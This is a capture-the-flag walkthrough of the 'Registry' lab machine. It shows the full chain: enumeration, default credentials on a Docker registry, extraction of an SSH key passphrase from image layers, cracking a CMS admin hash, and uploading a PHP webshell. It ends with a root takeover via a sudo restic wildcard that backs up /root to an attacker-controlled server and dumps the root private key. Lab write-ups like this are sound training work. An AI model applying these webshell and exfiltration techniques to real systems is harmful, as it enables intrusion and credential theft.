# Registry

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.89.161
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-08 05:23 EST
Nmap scan report for 10.129.89.161
Host is up (0.021s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

Both the websites point towards a nginx default page.&#x20;

### Web Enum

I ran a `gobuster` scan on both of these, and found an `/install` directory with some random characters.

<figure><img src="../../../.gitbook/assets/image (222).png" alt=""><figcaption></figcaption></figure>

There was also a `/bolt` endpoint that shows a basic sample site.

<figure><img src="../../../.gitbook/assets/image (3979).png" alt=""><figcaption></figcaption></figure>

Bolt CMS was a possibility of exploitation here. A `feroxbuster` search reveals this is the case:

<figure><img src="../../../.gitbook/assets/image (1345).png" alt=""><figcaption></figcaption></figure>

Based on the Bolt CMS Repo, we can check `changelog.md` to see the version and find that this is Bolt 3.6.4.

<figure><img src="../../../.gitbook/assets/image (1197).png" alt=""><figcaption></figcaption></figure>

This was a rather old machine, so there were RCE exploits available if I could find the credentials for the administrator. However, there were no credentials for me to exploit, and I could not do much with this. I was clearly missing something.&#x20;

I went back to the `/install` directory and downloaded the output as a file, only to find that it was a gzip file.

```
$ file install_file                 
install_file: gzip compressed data, last modified: Mon Jul 29 23:38:20 2019, from Unix, original size modulo 2^32 167772200
```

There was something in here, but it kept having a `unexpected EOF` error when trying to decompress it. To overcome this, we can use the `zcat` command to extract its contents. This was the output:

```
$ zcat install_file.gz | strings

gzip: install_file.gz: unexpected end of file
ca.crt
0000775
0000041
0000041
00000002106
13464123607
012215
ustar  
www-data
www-data
-----BEGIN CERTIFICATE-----
MIIC/DCCAeSgAwIBAgIJAIFtFmFVTwEtMA0GCSqGSIb3DQEBCwUAMBMxETAPBgNV
BAMMCFJlZ2lzdHJ5MB4XDTE5MDUwNjIxMTQzNVoXDTI5MDUwMzIxMTQzNVowEzER
MA8GA1UEAwwIUmVnaXN0cnkwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB
AQCw9BmNspBdfyc4Mt+teUfAVhepjje0/JE0db9Iqmk1DpjjWfrACum1onvabI/5
T5ryXgWb9kS8C6gzslFfPhr7tTmpCilaLPAJzHTDhK+HQCMoAhDzKXikE2dSpsJ5
zZKaJbmtS6f3qLjjJzMPqyMdt/i4kn2rp0ZPd+58pIk8Ez8C8pB1tO7j3+QAe9wc
r6vx1PYvwOYW7eg7TEfQmmQt/orFs7o6uZ1MrnbEKbZ6+bsPXLDt46EvHmBDdUn1
zGTzI3Y2UMpO7RXEN06s6tH4ufpaxlppgOnR2hSvwSXrWyVh2DVG1ZZu+lLt4eHI
qFJvJr5k/xd0N+B+v2HrCOhfAgMBAAGjUzBRMB0GA1UdDgQWBBTpKeRSEzvTkuWX
8/wn9z3DPYAQ9zAfBgNVHSMEGDAWgBTpKeRSEzvTkuWX8/wn9z3DPYAQ9zAPBgNV
HRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQABLgN9x0QNM+hgJIHvTEN3
LAoh4Dm2X5qYe/ZntCKW+ppBrXLmkOm16kjJx6wMIvUNOKqw2H5VsHpTjBSZfnEJ
UmuPHWhvCFzhGZJjKE+An1V4oAiBeQeEkE4I8nKJsfKJ0iFOzjZObBtY2xGkMz6N
7JVeEp9vdmuj7/PMkctD62mxkMAwnLiJejtba2+9xFKMOe/asRAjfQeLPsLNMdrr
CUxTiXEECxFPGnbzHdbtHaHqCirEB7wt+Zhh3wYFVcN83b7n7jzKy34DNkQdIxt9
QMPjq1S5SqXJqzop4OnthgWlwggSe/6z8ZTuDjdNIpx0tF77arh2rUOIXKIerx5B
-----END CERTIFICATE-----
readme.md
0000775
0000041
0000041
00000000201
13472260460
012667
ustar  
www-data
www-data
# Private Docker Registry
- https://docs.docker.com/registry/deploying/
- https://docs.docker.com/engine/security/certificates/
```

Interesting, we have a private docker registry hidden on this server. I tested out the `docker` directory endpoint, and eventually found it as a subdomain at `docker.registry.htb`.

### docker.registry.htb

I ran a `gobuster` scan on this and found this interesting endpoint:

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt  -u http://docker.registry.htb/ -t 100
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://docker.registry.htb/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/03/08 05:44:16 Starting gobuster in directory enumeration mode
===============================================================
/v2                   (Status: 301) [Size: 39] [--> /v2/]
```

When trying to access it, it requested for credentials:

<figure><img src="../../../.gitbook/assets/image (1010).png" alt=""><figcaption></figcaption></figure>

Using `admin:admin` worked. I was forwarded to what looked like a web API. I didn't have any commands to use, so doing some basic research for Docker Registry API commands was the next step. As usual, Hacktricks had some commands.

```
$ curl -H 'Authorization: Basic YWRtaW46YWRtaW4=' http://docker.registry.htb/v2/_catalog -L
{"repositories":["bolt-image"]}
```

So we have one repository here. We can pass the credentials we used earlier to view more information.

{% code overflow="wrap" %}
```
$ curl -H 'Authorization: Basic YWRtaW46YWRtaW4=' http://docker.registry.htb/v2/bolt-image/manifests/latest -L
{
   "schemaVersion": 1,
   "name": "bolt-image",
   "tag": "latest",
   "architecture": "amd64",
   "fsLayers": [
      {
         "blobSum": "sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b"
      },
      {
         "blobSum": "sha256:3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee"
      },
      {
         "blobSum": "sha256:02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c"
      },
      {
         "blobSum": "sha256:c71b0b975ab8204bb66f2b659fa3d568f2d164a620159fc9f9f185d958c352a7"
      },
      {
         "blobSum": "sha256:2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:f5029279ec1223b70f2cbb2682ab360e1837a2ea59a8d7ff64b38e9eab5fb8c0"
      },
      {
         "blobSum": "sha256:d9af21273955749bb8250c7a883fcce21647b54f5a685d237bc6b920a2ebad1a"
      },
      {
         "blobSum": "sha256:8882c27f669ef315fc231f272965cd5ee8507c0f376855d6f9c012aae0224797"
      },
      {
         "blobSum": "sha256:f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff"
      }
   ],
<TRUNCATED>
```
{% endcode %}

This confirms that we can download one of the blobs and perhaps find some files in it.&#x20;

```bash
$ curl -H 'Authorization: Basic YWRtaW46YWRtaW4=' http://docker.registry.htb/v2/bolt-image/blobs/sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b -L -o blob.tar
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   335  100   335    0     0   5348      0 --:--:-- --:--:-- --:--:--  5403
```

When viewing the file contents, we will find a file at `/etc/profile.d/01-ssh.sh`.

```bash
#!/usr/bin/expect -f
#eval `ssh-agent -s`
spawn ssh-add /root/.ssh/id_rsa
expect "Enter passphrase for /root/.ssh/id_rsa:"
send "GkOcz221Ftb3ugog\n";
expect "Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)"
interact
```

I downloaded the other files to see if there were any other interesting things. Eventually, I did find a SSH private key

<figure><img src="../../../.gitbook/assets/image (3069).png" alt=""><figcaption></figcaption></figure>

```bash
$ curl -H 'Authorization: Basic YWRtaW46YWRtaW4=' http://docker.registry.htb/v2/bolt-image/blobs/sha256:2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791 -L -o blob3.tar
# contents witin /root/.ssh/config:                   
Host registry
  User bolt
  Port 22
  Hostname registry.htb
# using password GkOcz221Ftb3ugog from earlier
```

With these, we can SSH in as `bolt`.

<figure><img src="../../../.gitbook/assets/image (1332).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Bolt SQLite

With access to the machine, I wanted to enumerate the `bolt` config files to see if I can find anything new. There was a database file `bolt.db` at `/var/www/html/bolt/app/databases`. I transferred this over using `scp.`

```
$ scp -i id_rsa bolt@registry.htb:/var/www/html/bolt/app/database/bolt.db .
Enter passphrase for key 'id_rsa': 
bolt.db                                                   100%  288KB   1.6MB/s   00:00
```

We can then use `sqlite3` to enumerate this.

```
sqlite> .tables
bolt_authtoken    bolt_field_value  bolt_pages        bolt_users      
bolt_blocks       bolt_homepage     bolt_relations  
bolt_cron         bolt_log_change   bolt_showcases  
bolt_entries      bolt_log_system   bolt_taxonomy   
sqlite> SELECT * from bolt_users;
1|admin|$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK|bolt@registry.htb|2019-10-17 14:34:52|10.10.14.2|Admin|["files://shell.php"]|1||||1||["root","everyone"]
```

We have a hash here that is cracked to give `strawberry`.

<figure><img src="../../../.gitbook/assets/image (3266).png" alt=""><figcaption></figcaption></figure>

Now, we can login to the `bolt` CMS and continue our enumeration.

### Bolt Dashboard

We can login with `admin:strawberry` to the admin dashboard.

<figure><img src="../../../.gitbook/assets/image (3666).png" alt=""><figcaption></figcaption></figure>

Great! Within the password hash, we saw another hint in the form of `shell.php`. As the administrator for bolt, we can actually create PHP files in the File Management tab. We can drop in a webshell and easily get an RCE as the next user.

Originally, this is not allowed since `.php` files are not included in the allowed types of files. However, as the administrator, we can change the `config.yml` file in Configuration > Main Configuration.

<figure><img src="../../../.gitbook/assets/image (3699).png" alt=""><figcaption></figcaption></figure>

Then we can upload whatever files we want.

```
$ curl http://10.129.89.166/bolt/files/cmd.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

However, I was unable to get a reverse shell through conventional means...

### Reverse Shell Attempt #2

The first reverse shell using a simple `bash` one-liner did not work for some reason. Probably was blocking all forms of remote connections.

To circumvent this, we can simply have the reverse shell connect back to a listener port on localhost using the SSH shell we got earlier.

<figure><img src="../../../.gitbook/assets/image (3014).png" alt=""><figcaption></figcaption></figure>

### Restic

Within the files earlier, I did see a `backup.php` file that was probably being used.

```
<?php shell_exec("sudo restic backup -r rest:http://backup.registry.htb/bolt bolt");
```

This file was using `restic` to store encrypted backups of files onto a certain directory.&#x20;

{% embed url="https://restic.net/" %}

I also found that the `www-data` user could execute `sudo` commands using `restic`.

```bash
www-data@registry:~/html$ sudo -l
sudo -l
Matching Defaults entries for www-data on registry:
    env_reset, exempt_group=sudo, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on registry:
    (root) NOPASSWD: /usr/bin/restic backup -r rest*
```

Based on docs, it seems that this was using a REST repository to host the files. Here's a Git Repository to explain what a rest server is:

{% embed url="https://github.com/restic/rest-server" %}

Since the `sudo` privilege had a wildcard in it, the exploit was to create a basic rest-server and backup the entirety of the machine onto it. We can host the rest-server on our Kali machine and port forward it to this machine to make it accessible.

First, we can start `rest-server` on our machine and do the port forwarding:

```bash
$ ./rest-server --path ../ --no-auth
Data directory: ../
Authentication disabled
Private repositories disabled
start server on :8000
# in separate terminal
ssh -i id_rsa -R 8000:127.0.0.1:8000 bolt@registry.htb
```

Then we need to create a repository on our rest-server for `restic` and backup the `/root` directory there:

```bash
www-data@registry:~/html$ restic init -r rest:http://localhost:8000
restic init -r rest:http://localhost:8000
tenter password for new repository: est

enter password again: test

created restic repository 6ad1468cd0 at rest:http://localhost:8000
www-data@registry:~/html$ sudo /usr/bin/restic backup -r rest:http://127.0.0.1:8000/ /root
</restic backup -r rest:http://127.0.0.1:8000/ /root
enter password for repository: test

password is correct
found 2 old cache directories in /var/www/.cache/restic, pass --cleanup-cache to remove them
scan [/root]
scanned 10 directories, 13 files in 0:00
[0:00] 100.00%  27.856 KiB / 27.856 KiB  23 / 23 items  0 errors  ETA 0:00 
duration: 0:00
snapshot beb14cb0 saved
```

Then we can access this repo from our machine easily.

```bash
$ restic -r . ls latest
enter password for repository: 
repository 6ad1468c opened (repository version 1) successfully, password is correct
created new cache in /home/kali/.cache/restic
snapshot beb14cb0 of [/root] filtered by [] at 2023-03-08 12:21:08.690059942 +0000 UTC):
/root
/root/.bash_history
/root/.bashrc
/root/.cache
/root/.cache/motd.legal-displayed
/root/.config
/root/.config/composer
/root/.config/composer/keys.dev.pub
/root/.config/composer/keys.tags.pub
/root/.gnupg
/root/.gnupg/private-keys-v1.d
/root/.local
/root/.local/share
/root/.local/share/nano
/root/.profile
/root/.selected_editor
/root/.ssh
/root/.ssh/authorized_keys
/root/.ssh/id_rsa
/root/.ssh/id_rsa.pub
/root/config.yml
/root/cron.sh
/root/root.txt
```

From here, we can dump the private SSH key of the `root` user.

```bash
$ restic -r . dump latest /root/.ssh/id_rsa
enter password for repository: 
repository 6ad1468c opened (repository version 1) successfully, password is correct
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAmiGiXpswTyHhjgC55jHRWlGX1asEMyDFfkVwhuNohv/4cQKm
<TRUNCATED>
```

Then we can SSH in as `root`.

<figure><img src="../../../.gitbook/assets/image (2420).png" alt=""><figcaption></figcaption></figure>

Cool machine. Really good despite being like 3 years old.
